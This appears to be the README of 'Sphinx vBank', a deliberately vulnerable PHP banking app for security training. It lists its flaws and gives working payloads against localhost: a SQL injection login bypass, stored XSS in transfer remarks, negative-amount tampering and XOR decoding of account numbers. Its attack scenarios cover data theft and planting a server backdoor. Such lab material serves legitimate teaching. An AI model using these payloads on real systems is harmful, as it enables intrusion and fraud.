# vBank Vulnerable Application - Security Testing Guide

This is **Sphinx vBank**, a deliberately vulnerable web application designed for security training and authorized penetration testing. It contains multiple critical vulnerabilities across the OWASP TOP 10.

## ⚠️ IMPORTANT - LEGAL DISCLAIMER

**This application is for educational and authorized testing purposes ONLY.** 

- Use only in controlled lab environments
- Obtain proper authorization before testing
- Do not deploy to production systems
- Unauthorized access to computer systems is illegal

## Quick Start

### Prerequisites
- Docker & Docker Compose installed
- Linux/Mac/Windows with bash
- Python 3 (for exploit testing script)
- Curl (for manual testing)

### Installation & Setup

```bash
# Navigate to the vBank directory
cd bank_app

# Make setup script executable
chmod +x setup.sh

# Run setup
./setup.sh
```

The setup script will:
1. Stop any running containers
2. Build Docker images
3. Start MySQL (version 5.5) and PHP (version 5.6) containers
4. Wait for services to be ready
5. Display credentials and URLs

### Access the Application

- **URL**: http://localhost/
- **Default Users**:
  - Username: `alex` | Password: `413Xp455`
  - Username: `bob` | Password: `b0BP4S5`

### Database Access

```bash
# Connect to MySQL from host (requires mysql-client)
mysql -h 127.0.0.1 -u root -paaa vbank

# Or from Docker
docker exec -it vbank_mysql mysql -u root -paaa vbank
```

**Database Credentials**:
- Host: `localhost:3306` (or `mysql` from within Docker)
- User: `root`
- Password: `aaa`
- Database: `vbank`

### phpMyAdmin Web Interface

- **URL**: http://localhost:8081/
- **Username**: `root`
- **Password**: `aaa`
- **Server**: `mysql`

phpMyAdmin provides a graphical interface to browse and modify the database directly.

---

## Vulnerability Analysis & Exploitation

Detailed, manual walkthroughs for each vulnerability can be found in:
*   **[PENETRATION_TESTING_GUIDE.md](PENETRATION_TESTING_GUIDE.md)**: Manual guides for SQLi (Auth Bypass, Password Resets, Account Creation), XSS, RCE, and Request Manipulation.
*   **[CHEATSHEET.md](CHEATSHEET.md)**: Quick reference for payloads and account XOR keys.

### Key Information for Testing

**XOR Encryption Key**: `0x0BADC0DE` (3735928830)

This key is used to "encrypt" account numbers. It can be easily reversed:
```
original_account = xored_account XOR 0x0BADC0DE
```

**Known Account Numbers**:
- `11111111` (Owner: alex, Balance: 1000)
- `22222222` (Owner: bob, Balance: 222)
- `33333333` (Owner: alex, Balance: 344)

**Known Xored Values** (for reference):
- 11111111 → 252170513
- 22222222 → 243688756
- 33333333 → 235207009

---

## Testing Tools & Methods

### 1. Automated Testing with Python Script

```bash
# Make script executable
chmod +x test_exploits.py

# Run all tests
python3 test_exploits.py

# Run specific test
python3 test_exploits.py --test sql_injection_login
python3 test_exploits.py --test stored_xss
python3 test_exploits.py --test loan_tampering
python3 test_exploits.py --test validation_bypass
python3 test_exploits.py --test account_enumeration
python3 test_exploits.py --test sql_injection_transfer
python3 test_exploits.py --test rce

# Verbose output
python3 test_exploits.py --verbose
```

### 2. Manual Testing with cURL

#### SQL Injection - Login Bypass
```bash
curl -G "http://localhost/login.php" \
  --data-urlencode "username=' OR '1'='1" \
  --data-urlencode "password=anything" \
  -v
```

#### Account Number Decoding
```bash
python3 -c "
xor_key = 0x0BADC0DE
xored = 252170513
print(f'Account: {xored ^ xor_key}')
"
```

#### Stored XSS via Transfer
```bash
# After obtaining session cookie
SESSION_ID="<your_session_id_here>"

curl "http://localhost/index.php" \
  --cookie "USECURITYID=$SESSION_ID" \
  -G \
  --data-urlencode "page=htbtransfer" \
  --data-urlencode "srcacc=252170513" \
  --data-urlencode "dstbank=41131337" \
  --data-urlencode "dstacc=22222222" \
  --data-urlencode "amount=1" \
  --data-urlencode "remark=<img src=x onerror=\"alert('XSS')\">" \
  --data-urlencode "htbtransfer=Transfer" \
  -v
```

### 3. Manual Testing with HTTP Proxy

#### Using Burp Suite Community Edition

1. **Start Burp Suite**
   - Configure proxy on localhost:8080
   - Configure Firefox/Chrome to use proxy

2. **Capture Login Request**
   - Navigate to http://localhost/
   - In Burp Proxy, capture the POST to login.php
   - Modify username to: `' OR '1'='1`
   - Forward request

3. **Modify Transfer Amount**
   - Log in normally
   - Go to Transfer Funds
   - Intercept the transfer request
   - Change `amount=100` to `amount=-500`
   - Forward

4. **Inject XSS Payload**
   - Navigate to Account Details
   - Intercept request
   - Modify remark field in earlier transfer
   - Add: `<script>alert(document.cookie)</script>`

### 4. Browser Developer Tools

#### Test XSS
1. Log in
2. Go to Account Details
3. Open Browser Developer Tools (F12)
4. In Console, type:
```javascript
document.body.innerHTML += '<img src=x onerror="alert(\'XSS\')">'
```

#### Decode XOR
```javascript
// In browser console
const xorKey = 0x0BADC0DE;
const xored = 252170513;
console.log(xored ^ xorKey);  // Output: 11111111
```

---

## Docker Management

### View Application Logs
```bash
# All services
docker-compose logs -f

# Specific service
docker-compose logs -f php
docker-compose logs -f mysql
docker-compose logs -f phpmyadmin
```

### Stop Services
```bash
docker-compose down
```

### Restart Services
```bash
docker-compose restart
```

### Access PHP Container
```bash
docker exec -it vbank_app bash
```

### Access MySQL Container
```bash
docker exec -it vbank_mysql mysql -u root -paaa vbank
```

### Access phpMyAdmin
Open http://localhost:8081/ in your browser
- Username: `root`
- Password: `aaa`
- Server: `mysql`

---

## Vulnerability Map

| # | Vulnerability | Location | Severity | CWE | OWASP |
|---|---|---|---|---|---|
| 1 | SQL Injection (Auth) | login.php:16 | Critical | CWE-89 | A03:2021 |
| 2 | SQL Injection (Transfer) | htbtransfer.page:39 | Critical | CWE-89 | A03:2021 |
| 3 | RCE via /e modifier | htbdetails.page:56 | Critical | CWE-95 | A03:2021 |
| 4 | Stored XSS | htbdetails.page:45 | High | CWE-79 | A03:2021 |
| 5 | Loan Amount Tampering | htbloanconf.page | High | CWE-20 | A04:2021 |
| 6 | Client-Side Validation Bypass | htb.js | High | CWE-602 | A05:2021 |
| 7 | Plain Text Passwords | users table | High | CWE-256 | A02:2021 |
| 8 | No CSRF Protection | All forms | High | CWE-352 | A01:2021 |
| 9 | Path Traversal | htb.inc | Medium | CWE-22 | A01:2021 |

---

## File Structure

```
bank_app/
├── attacks.md                 # Comprehensive vulnerability documentation
├── docker-compose.yml         # Docker Compose configuration
├── Dockerfile                 # PHP 5.6 with MySQL support
├── php.ini                    # PHP configuration
├── setup.sh                   # Automated setup script
├── test_exploits.py          # Python exploitation testing script
├── vbank.sql                 # Database schema and sample data
├── README.md                 # This file
├── htdocs/                   # Web root
│   ├── index.php            # Main application entry point
│   ├── login.php            # Login handler (VULNERABLE)
│   ├── htb.css              # Styling
│   ├── htb.js               # Client-side JS (client-side validation)
│   └── images/              # Static images
├── etc/
│   ├── config.php           # Application configuration
│   └── htb.inc              # Helper functions (vulnerable htb_load_page)
└── pages/
    ├── htbhead.page         # HTML head
    ├── htblogin.page        # Login form
    ├── htbmain.page         # Main page
    ├── htbaccounts.page     # Accounts list
    ├── htbdetails.page      # Account details (VULNERABLE to XSS & RCE)
    ├── htbtransfer.page     # Transfer form (VULNERABLE to SQL injection)
    ├── htbloanreq.page      # Loan request
    ├── htbloanconf.page     # Loan confirmation (VULNERABLE to tampering)
    └── ...                  # Other pages
```

---

## Technical Details

### Application Stack
- **Language**: PHP 5.6 (with deprecated functions)
- **Database**: MySQL 5.5
- **Web Server**: Apache 2.4
- **Containerization**: Docker & Docker Compose

### Why These Versions?
- PHP 5.6: Includes deprecated functions like `preg_replace()` with /e modifier (security risk used in app)
- MySQL 5.5: Legacy compatibility, demonstrates old database vulnerabilities
- Apache 2.4: Standard legacy setup

### Key Vulnerable Features
1. **mysql_* Functions**: Deprecated, no prepared statement support used
2. **preg_replace /e**: Executes replacement string as PHP code
3. **No Output Encoding**: Direct echo of user data and database records
4. **Client-Side Validation Only**: No server-side input validation
5. **XOR Obfuscation**: Not encryption, easily reversible

---

## Attack Scenarios

### Scenario 1: Unauthenticated Account Takeover
1. Use SQL injection to bypass login
2. Gain access as first user in database (admin)
3. Access all features and user data

**Time to exploit**: < 1 minute  
**No tools required**: Browser only

### Scenario 2: Unauthorized Fund Transfer
1. Log in as legitimate user
2. Intercept transfer request with proxy
3. Modify destination account or amount
4. Execute unauthorized transfer

**Time to exploit**: 5-10 minutes  
**Tools**: Burp Suite or equivalent proxy

### Scenario 3: Database Data Exfiltration
1. Authenticate via SQL injection bypass
2. Inject SQL to extract all user passwords from database
3. Store results in transfer remarks field
4. Read back via account details

**Time to exploit**: 10-15 minutes  
**Knowledge required**: Basic SQL injection

### Scenario 4: Persistent Code Execution
1. Use /e modifier vulnerability in query parameter
2. Execute arbitrary PHP code on server
3. Create backdoor script for persistent access

**Time to exploit**: 15-20 minutes  
**Impact**: Full server compromise

---

## References & Further Learning

### OWASP Resources
- [OWASP TOP 10 2021](https://owasp.org/Top10/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)

### CWE Resources
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')](https://cwe.mitre.org/data/definitions/95.html)

### Books
- "The Web Application Hacker's Handbook" by Stuttard & Pinto
- "Web Security Testing Cookbook" by Stuttard, Pinto & Narra
- "The Art of Software Security Testing" by Rankin

### Tools for Testing
- [Burp Suite Community](https://portswigger.net/burp/communitydownload)
- [OWASP ZAP](https://www.zaproxy.org/)
- [Postman](https://www.postman.com/)
- [curl](https://curl.se/)

---

## Troubleshooting

### Docker Containers Won't Start

```bash
# Check logs
docker-compose logs

# Check specific service
docker-compose logs phpmyadmin
docker-compose logs php
docker-compose logs mysql

# Rebuild images
docker-compose build --no-cache

# Check if ports are in use
lsof -i :80
lsof -i :3306
lsof -i :8081

# Remove old containers
docker-compose down -v
docker system prune
```

### PHP Extensions Not Loading

```bash
# Check PHP configuration
docker exec vbank_app php -m

# Check PHP errors
docker exec vbank_app cat /var/log/php_errors.log
```

### MySQL Connection Issues

```bash
# Test connection from PHP container
docker exec vbank_app mysql -h mysql -u root -paaa vbank -e "SELECT 1;"

# Check MySQL logs
docker-compose logs mysql
```

### Application Not Accessible

```bash
# Verify containers are running
docker ps

# Check Apache is working
docker exec vbank_app curl http://localhost/

# Test with different port
curl http://localhost:8080/  # If port 80 is in use
```

---

## Next Steps

1. **Read attacks.md** - Detailed vulnerability analysis
2. **Run setup.sh** - Start the application
3. **Test with test_exploits.py** - Verify exploitability
4. **Manual Testing** - Use Burp Suite or ZAP for hands-on testing
5. **Study the Code** - Review [login.php](htdocs/login.php) and [htbdetails.page](pages/htbdetails.page)
6. **Document Findings** - Create your own security report

---

## Maintenance & Cleanup

```bash
# Stop and remove all containers and volumes
docker-compose down -v

# Remove Docker images
docker-compose down --rmi all

# Full cleanup
docker system prune -a --volumes

# View Docker resource usage
docker stats
```

---

## Support & Questions

**Author**: Ian Tayebwa    
**Email**: tayebwaian0@gmail.com  

**Remember**: With great power comes great responsibility. Use these skills ethically and legally.
